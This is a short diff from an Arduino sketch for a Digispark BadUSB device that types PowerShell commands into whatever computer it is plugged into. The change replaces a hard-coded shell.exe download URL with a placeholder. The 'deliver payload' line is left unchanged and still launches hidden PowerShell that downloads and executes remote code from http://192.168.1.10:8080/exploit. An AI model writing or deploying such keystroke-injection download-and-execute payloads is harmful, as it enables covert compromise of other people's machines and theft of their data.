@@ -39,7 +39,7 @@ void setup() {
   delay(60);
   
   //powershell donwload and run
-  DigiKeyboard.println("Invoke-WebRequest -Uri '192.168.0.10/shell.exe' -OutFile autoruns.exe; .\autoruns.exe")
+  DigiKeyboard.println("Invoke-WebRequest -Uri '<url of payload>' -OutFile autoruns.exe; .\autoruns.exe")
   
   //deliver payload
   DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.10:8080/exploit');");
